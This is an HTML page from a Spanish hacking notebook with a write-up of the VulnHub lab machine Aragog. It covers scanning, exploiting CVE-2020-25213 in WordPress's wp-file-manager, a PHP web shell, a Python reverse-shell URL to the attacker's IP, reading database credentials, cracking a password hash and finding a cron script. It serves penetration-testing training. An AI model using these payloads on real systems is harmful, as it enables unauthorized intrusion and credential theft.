@@ -1,0 +1,528 @@
+<!DOCTYPE HTML>
+<html lang="es" class="sidebar-visible no-js ayu">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Aragog - Secronomicón</title>
+        <!-- Custom HTML head -->
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="Libro de notas donde encontrarás cada truco/técnica/guía de hacking que he aprendido y recolectado de CTFS, aplicaciones reales, lectura de writeups y noticias.">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../favicon.png">
+        <link rel="stylesheet" href="../../../css/variables.css">
+        <link rel="stylesheet" href="../../../css/general.css">
+        <link rel="stylesheet" href="../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../highlight.css">
+        <link rel="stylesheet" href="../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "ayu";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('ayu')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../../index.html">Secronomicón</a></li><li class="chapter-item expanded affix "><li class="part-title">Guías / Cursos</li><li class="chapter-item expanded "><a href="../../../guides/oscp_bof/index.html"><strong aria-hidden="true">1.</strong> OSCP Buffer Overflow</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Port Swigger Academy</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../guides/port_swigger_academy/sql_injection.html"><strong aria-hidden="true">2.1.</strong> SQL Injection</a></li></ol></li><li class="chapter-item expanded "><a href="../../../guides/pwncollege/index.html"><strong aria-hidden="true">3.</strong> PwnCollege</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../guides/pwncollege/0_module/index.html"><strong aria-hidden="true">3.1.</strong> Módulo 0</a></li></ol></li><li class="chapter-item expanded "><a href="../../../guides/active_directory/index.html"><strong aria-hidden="true">4.</strong> Active Directory</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../guides/active_directory/0_general.html"><strong aria-hidden="true">4.1.</strong> Teoría General</a></li><li class="chapter-item expanded "><a href="../../../guides/active_directory/1_attacking.html"><strong aria-hidden="true">4.2.</strong> Atacando Active Directory</a></li></ol></li><li class="chapter-item expanded "><a href="../../../guides/ecpptv2_lab/index.html"><strong aria-hidden="true">5.</strong> eCPPTv2 s4viLab</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../guides/ecpptv2_lab/1_aragog/index.html" class="active"><strong aria-hidden="true">5.1.</strong> Aragog</a></li><li class="chapter-item expanded "><a href="../../../guides/ecpptv2_lab/2_nagini/index.html"><strong aria-hidden="true">5.2.</strong> Nagini</a></li><li class="chapter-item expanded "><a href="../../../guides/ecpptv2_lab/3_fawkes/index.html"><strong aria-hidden="true">5.3.</strong> Fawkes</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.</strong> Matrix 1</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.5.</strong> Brainpan</div></li></ol></li><li class="chapter-item expanded "><a href="../../../guides/nightmare/index.html"><strong aria-hidden="true">6.</strong> Nightmare</a></li><li class="chapter-item expanded affix "><li class="part-title">Misc</li><li class="chapter-item expanded "><a href="../../../templates/index.html"><strong aria-hidden="true">7.</strong> Templates</a></li><li class="chapter-item expanded affix "><li class="part-title">Cheat Sheets</li><li class="chapter-item expanded "><a href="../../../cheat_sheets/general.html"><strong aria-hidden="true">8.</strong> General</a></li><li class="chapter-item expanded "><a href="../../../cheat_sheets/active_directory.html"><strong aria-hidden="true">9.</strong> Active Directory</a></li><li class="chapter-item expanded "><a href="../../../cheat_sheets/network/general.html"><strong aria-hidden="true">10.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../cheat_sheets/network/pivoting.html"><strong aria-hidden="true">10.1.</strong> Pivoting</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.</strong> Pwning</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../cheat_sheets/pwning/linux.html"><strong aria-hidden="true">11.1.</strong> Linux pwning</a></li><li class="chapter-item expanded "><a href="../../../cheat_sheets/pwning/bof-oscp.html"><strong aria-hidden="true">11.2.</strong> OSCP Buffer Overflow</a></li></ol></li><li class="chapter-item expanded "><a href="../../../cheat_sheets/fuzzing.html"><strong aria-hidden="true">12.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="../../../cheat_sheets/inyecciones.html"><strong aria-hidden="true">13.</strong> Inyecciones</a></li><li class="chapter-item expanded "><a href="../../../cheat_sheets/transfer.html"><strong aria-hidden="true">14.</strong> Transferencia de archivos</a></li><li class="chapter-item expanded affix "><li class="part-title">CTFs</li><li class="chapter-item expanded "><a href="../../../ctfs/20220922_ctf-core2022/index.html"><strong aria-hidden="true">15.</strong> 22/09/2022 - IPN Core 2022 CTF</a></li><li class="chapter-item expanded affix "><li class="part-title">Hack The Box</li><li class="chapter-item expanded "><div><strong aria-hidden="true">16.</strong> Battlegrounds</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../htb/battlegrounds/mayhem/index.html"><strong aria-hidden="true">16.1.</strong> Cyber Mayhem</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">17.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.</strong> Boxes</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.</strong> Linux</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.1.</strong> Fácil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.2.</strong> Medio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.3.</strong> Difícil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.4.</strong> Locura</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.1.</strong> Fácil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../htb/boxes/windows/1_facil/Active/index.html"><strong aria-hidden="true">18.2.1.1.</strong> Active</a></li><li class="chapter-item expanded "><a href="../../../htb/boxes/windows/1_facil/Devel/index.html"><strong aria-hidden="true">18.2.1.2.</strong> Devel</a></li><li class="chapter-item expanded "><a href="../../../htb/boxes/windows/1_facil/Remote/index.html"><strong aria-hidden="true">18.2.1.3.</strong> Remote</a></li><li class="chapter-item expanded "><a href="../../../htb/boxes/windows/1_facil/Access/index.html"><strong aria-hidden="true">18.2.1.4.</strong> Access</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.2.</strong> Medio</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../htb/boxes/windows/2_medio/Chatterbox/index.html"><strong aria-hidden="true">18.2.2.1.</strong> Chatterbox</a></li><li class="chapter-item expanded "><a href="../../../htb/boxes/windows/2_medio/Jeeves/index.html"><strong aria-hidden="true">18.2.2.2.</strong> Jeeves</a></li><li class="chapter-item expanded "><a href="../../../htb/boxes/windows/2_medio/SecNotes/index.html"><strong aria-hidden="true">18.2.2.3.</strong> SecNotes</a></li><li class="chapter-item expanded "><a href="../../../htb/boxes/windows/2_medio/Silo/index.html"><strong aria-hidden="true">18.2.2.4.</strong> Silo</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.3.</strong> Difícil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../htb/boxes/windows/3_dificil/Control/index.html"><strong aria-hidden="true">18.2.3.1.</strong> Control</a></li><li class="chapter-item expanded "><a href="../../../htb/boxes/windows/3_dificil/Search/index.html"><strong aria-hidden="true">18.2.3.2.</strong> Search</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.4.</strong> Locura</div></li></ol></li></ol></li><li class="chapter-item expanded "><li class="part-title">echoCTF</li><li class="chapter-item expanded "><div><strong aria-hidden="true">19.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">20.</strong> Networks</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.</strong> Targets</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">21.1.</strong> Principiante</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.2.</strong> Básico</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../echoCTF/targets/2_basic/Flanders/index.html"><strong aria-hidden="true">21.2.1.</strong> Flanders</a></li><li class="chapter-item expanded "><a href="../../../echoCTF/targets/2_basic/Smithers/index.html"><strong aria-hidden="true">21.2.2.</strong> Smithers</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.3.</strong> Intermedio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.4.</strong> Avanzado</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.5.</strong> Experto</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../echoCTF/targets/5_expert/gogo-yubari/index.html"><strong aria-hidden="true">21.5.1.</strong> Gogo Yubari</a></li><li class="chapter-item expanded "><a href="../../../echoCTF/targets/5_expert/hajmetr/index.html"><strong aria-hidden="true">21.5.2.</strong> Hajmetr</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.6.</strong> Guru</div></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Secronomicón</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="aragog"><a class="header" href="#aragog">Aragog</a></h1>
+<p>Write-up de la máquina aragog de la plataforma <a href="https://www.vulnhub.com">vulnhub</a> (en un ejercicio de laboratorio para eCPPTv2).</p>
+<p><img src="images/cover.jpg" alt="Aragog cover" /></p>
+<h2 id="tabla-de-contenido"><a class="header" href="#tabla-de-contenido">Tabla de Contenido <!-- omit from toc --></a></h2>
+<ul>
+<li><a href="#introducci%C3%B3n">Introducción</a>
+<ul>
+<li><a href="#t%C3%A9cnicas-vistas--tags">Técnicas vistas / Tags</a></li>
+<li><a href="#estad%C3%ADsticas">Estadísticas</a></li>
+</ul>
+</li>
+<li><a href="#reconocimiento">Reconocimiento</a>
+<ul>
+<li><a href="#escaneo-de-host">Escaneo de host</a>
+<ul>
+<li><a href="#escaneo-completo-de-puertos">Escaneo completo de puertos</a></li>
+<li><a href="#escaneo-espec%C3%ADfico">Escaneo específico</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#enumeraci%C3%B3n">Enumeración</a>
+<ul>
+<li><a href="#servicios">Servicios</a>
+<ul>
+<li><a href="#http---80">http - 80</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#explotaci%C3%B3n">Explotación</a>
+<ul>
+<li><a href="#pasos-previos--preparaci%C3%B3n">Pasos previos | Preparación</a></li>
+<li><a href="#ejecuci%C3%B3n">Ejecución</a></li>
+</ul>
+</li>
+<li><a href="#post-explotaci%C3%B3n">Post Explotación</a>
+<ul>
+<li><a href="#enumeraci%C3%B3n-1">Enumeración</a></li>
+<li><a href="#escalaci%C3%B3n-de-privilegios">Escalación de privilegios</a>
+<ul>
+<li><a href="#www-data--hagrid98">www-data → hagrid98</a></li>
+<li><a href="#hagrid98--root">hagrid98 → root</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#referencias">Referencias</a></li>
+</ul>
+<h2 id="introducción"><a class="header" href="#introducción">Introducción</a></h2>
+<h3 id="técnicas-vistas--tags"><a class="header" href="#técnicas-vistas--tags">Técnicas vistas / Tags</a></h3>
+<ul>
+<li>Wordpress plugin wp-file-manager exploit.</li>
+<li>CVE-2020-25213.</li>
+<li>Abuso de cronjob.</li>
+</ul>
+<h3 id="estadísticas"><a class="header" href="#estadísticas">Estadísticas</a></h3>
+<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
+<tr><td>Nombre</td><td><a href="https://www.vulnhub.com/entry/harrypotter-aragog-102,688/">Aragog</a></td></tr>
+<tr><td>OS</td><td>Linux</td></tr>
+<tr><td>Dificultad asignada</td><td>Fácil</td></tr>
+<tr><td>Creadores</td><td><a href="https://www.vulnhub.com/author/mansoor-r,794/">Mansoor R</a></td></tr>
+</tbody></table>
+</div>
+<h2 id="reconocimiento"><a class="header" href="#reconocimiento">Reconocimiento</a></h2>
+<h3 id="escaneo-de-host"><a class="header" href="#escaneo-de-host">Escaneo de host</a></h3>
+<h4 id="escaneo-completo-de-puertos"><a class="header" href="#escaneo-completo-de-puertos">Escaneo completo de puertos</a></h4>
+<pre><code class="language-bash">└─$ sudo nmap -sS --min-rate 5000 -v -p- -open -n -Pn -oG nmap/all_ports_ss $TARGET
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-05 22:16 EST
+Initiating ARP Ping Scan at 22:16
+Scanning 192.168.111.175 [1 port]
+Completed ARP Ping Scan at 22:16, 0.04s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 22:16
+Scanning 192.168.111.175 [65535 ports]
+Discovered open port 80/tcp on 192.168.111.175
+Discovered open port 22/tcp on 192.168.111.175
+Completed SYN Stealth Scan at 22:16, 1.09s elapsed (65535 total ports)
+Nmap scan report for 192.168.111.175
+Host is up (0.000046s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 00:0C:29:18:3F:A9 (VMware)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds
+           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
+</code></pre>
+<h4 id="escaneo-específico"><a class="header" href="#escaneo-específico">Escaneo específico</a></h4>
+<pre><code class="language-bash">└─$ nmap -sCV -p 80,22 -oN nmap/targeted $TARGET
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-05 22:16 EST
+Nmap scan report for 192.168.111.175
+Host is up (0.00027s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
+|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
+|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.38 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.57 seconds
+</code></pre>
+<h2 id="enumeración"><a class="header" href="#enumeración">Enumeración</a></h2>
+<h3 id="servicios"><a class="header" href="#servicios">Servicios</a></h3>
+<h4 id="http---80"><a class="header" href="#http---80">http - 80</a></h4>
+<p>Después de la ejecución de <code>ffuf</code> se identificó la ruta <code>/blog</code>, al navegarla se visualizó  que se trataba de un sitio en Wordpress. Por lo que posteriormente se ejecutó <code>wpscan</code> para enumerar el sitio.</p>
+<pre><code class="language-bash">└─$ wpscan --url http://192.168.111.175/blog/ --force --plugins-detection aggressive
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.20
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://192.168.111.175/blog/ [192.168.111.175]
+[+] Started: Mon Mar  6 09:29:19 2023
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.38 (Debian)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://192.168.111.175/blog/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://192.168.111.175/blog/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://192.168.111.175/blog/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.0.12 identified (Insecure, released on 2021-04-14).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://192.168.111.175/blog/, Match: '-release.min.js?ver=5.0.12'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://192.168.111.175/blog/, Match: 'WordPress 5.0.12'
+
+[i] The main theme could not be detected.
+
+[+] Enumerating All Plugins (via Aggressive Methods)
+ Checking Known Locations - Time: 00:01:06 &lt;=======================================================================&gt; (102457 / 102457) 100.00% Time: 00:01:06
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] akismet
+ | Location: http://192.168.111.175/blog/wp-content/plugins/akismet/
+ | Latest Version: 5.0.2
+ | Last Updated: 2022-12-01T17:18:00.000Z
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://192.168.111.175/blog/wp-content/plugins/akismet/, status: 500
+ |
+ | The version could not be determined.
+
+[+] wp-file-manager
+ | Location: http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/
+ | Last Updated: 2023-02-08T10:32:00.000Z
+ | Readme: http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/readme.txt
+ | [!] The version is out of date, the latest version is 7.1.8
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/, status: 200
+ |
+ | Version: 6.0 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/readme.txt
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:06 &lt;==============================================================================&gt; (137 / 137) 100.00% Time: 00:00:06
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Mon Mar  6 09:30:39 2023
+[+] Requests Done: 102637
+[+] Cached Requests: 8
+[+] Data Sent: 28.722 MB
+[+] Data Received: 26.056 MB
+[+] Memory used: 383.711 MB
+[+] Elapsed time: 00:01:20
+</code></pre>
+<p>Dada la información recopilada se buscaron vulnerabilidades de los plugins identificados encontrado el CVE-2020-25213 en <code>wp-file-manager</code>.</p>
+<h2 id="explotación"><a class="header" href="#explotación">Explotación</a></h2>
+<h4 id="pasos-previos--preparación"><a class="header" href="#pasos-previos--preparación">Pasos previos | Preparación</a></h4>
+<p>Se encontró un <a href="https://github.com/mansoorr123/wp-file-manager-CVE-2020-25213/blob/main/wp-file-manager-exploit.sh">exploit público</a> para validar la vulnerabilidad y explotarla. Previamente preparando el siguiente código en php para ejecutar comandos en la máquina, dado que la vulnerabilidad permite subir archivos.</p>
+<pre><code class="language-php">&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;
+</code></pre>
+<h4 id="ejecución"><a class="header" href="#ejecución">Ejecución</a></h4>
+<pre><code class="language-bash">└─$ bash exp.sh --wp_url http://192.168.111.175/blog -f $(pwd)/evil.php --verbose
+
+============================================================================================
+wp-file-manager wordpress plugin Unauthenticated RCE Exploit    By: Mansoor R (@time4ster)
+============================================================================================
+
+curl POC :
+curl -ks --max-time 5 --user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36&quot; -F &quot;reqid=17457a1fe6959&quot; -F &quot;cmd=upload&quot; -F &quot;target=l1_Lw&quot;  -F &quot;mtime[]=1576045135&quot; -F &quot;upload[]=@//home/srrequiem/Documents/ecpptv2_lab/1_aragog/exploits/evil.php&quot; &quot;http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php&quot;
+
+[+] W00t! W00t! File uploaded successfully.
+Location:  /blog/wp-content/plugins/wp-file-manager/lib/php/../files/evil.php
+</code></pre>
+<p>Accediendo a la url por medio de la url <code>http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/lib/files/evil.php</code> permitiendo entablar una reverse shell con:</p>
+<pre><code class="language-text">http://192.168.111.175/blog/wp-content/plugins/wp-file-manager/lib/files/evil.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.111.162%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27
+</code></pre>
+<h2 id="post-explotación"><a class="header" href="#post-explotación">Post Explotación</a></h2>
+<h3 id="enumeración-1"><a class="header" href="#enumeración-1">Enumeración</a></h3>
+<p>Posteriormente, al intentar acceder a la base de datos disponible con las credenciales dentro de <code>/usr/share/wordpress/wp-config.php</code> y fallar, se intentó con las que se encuentran de ejemplo en los sitios de wordpress <code>/etc/wordpress/config-default.php</code>.</p>
+<pre><code class="language-bash">&lt;?php
+define('DB_NAME', 'wordpress');
+define('DB_USER', 'root');
+define('DB_PASSWORD', 'mySecr3tPass');
+define('DB_HOST', 'localhost');
+define('DB_COLLATE', 'utf8_general_ci');
+define('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');
+?&gt;
+</code></pre>
+<p>Obteniendo así acceso a la base de datos y pudiendo visualizar la lista de usuarios y hashes que se encuentran registrados en wordpress, coincidiendo en que el usuario <code>hagrid98</code> es también usuario de sistema.</p>
+<pre><code class="language-bash">MariaDB [wordpress]&gt; select user_login,user_pass from wp_users;
+select user_login,user_pass from wp_users;
++------------+------------------------------------+
+| user_login | user_pass                          |
++------------+------------------------------------+
+| hagrid98   | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. |
++------------+------------------------------------+
+1 row in set (0.001 sec)
+</code></pre>
+<h3 id="escalación-de-privilegios"><a class="header" href="#escalación-de-privilegios">Escalación de privilegios</a></h3>
+<h4 id="www-data--hagrid98"><a class="header" href="#www-data--hagrid98">www-data → hagrid98</a></h4>
+<p>Al obtener el hash de la contraseña se hizo uso de <code>john</code> para crackearla y poder escalar como ese usuario.</p>
+<pre><code class="language-bash">└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hagrid98.hash
+Created directory: /home/srrequiem/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+password123      (?)
+1g 0:00:00:00 DONE (2023-03-06 12:59) 25.00g/s 38400p/s 38400c/s 38400C/s 753951..mexico1
+Use the &quot;--show --format=phpass&quot; options to display all of the cracked passwords reliably
+Session completed.
+</code></pre>
+<p>Permitiendo el logueo con este usuario y acceso al primer horrocrux.</p>
+<pre><code class="language-bash">hagrid98@Aragog:~$ cat horcrux1.txt
+horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
+hagrid98@Aragog:~$ echo 'MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==' | base64 -d &amp;&amp; echo
+1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets
+</code></pre>
+<h4 id="hagrid98--root"><a class="header" href="#hagrid98--root">hagrid98 → root</a></h4>
+<p>Como parte de la enumeración se encontró dentro de <code>/opt</code> un archivo <code>.sh</code> que realiza una copia a la carpeta <code>/tmp</code>, lo cuál dado que se puede modificar con el usuario obtenido, se puede posteriormente corroborar si está siendo ejecutado de alguna manera.</p>
+<pre><code class="language-bash">hagrid98@Aragog:~$ ls -la /opt/
+total 12
+drwxr-xr-x  2 root     root     4096 Apr  1  2021 .
+drwxr-xr-x 18 root     root     4096 Mar 31  2021 ..
+-rwxr-xr-x  1 hagrid98 hagrid98  132 Feb  6 10:23 .backup.sh
+hagrid98@Aragog:~$ cat /opt/.backup.sh
+#!/bin/bash
+
+cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
